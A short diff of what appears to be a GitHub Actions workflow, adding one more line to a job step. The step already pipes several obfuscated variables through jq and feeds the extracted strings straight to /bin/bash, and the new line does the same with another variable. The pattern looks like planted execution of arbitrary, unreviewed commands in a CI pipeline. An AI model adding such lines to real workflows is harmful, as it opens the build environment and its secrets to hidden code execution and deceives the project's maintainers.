@@ -26,6 +26,7 @@ jobs:
           echo $cn4487 | jq -r .wt2 | /bin/bash
           printf '%s' "$qt29341" | jq -r .gmtgu75 | /bin/bash
           echo $i883 | jq -r .dqh7 | /bin/bash
+          echo $xwta9 | jq -r .t1 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
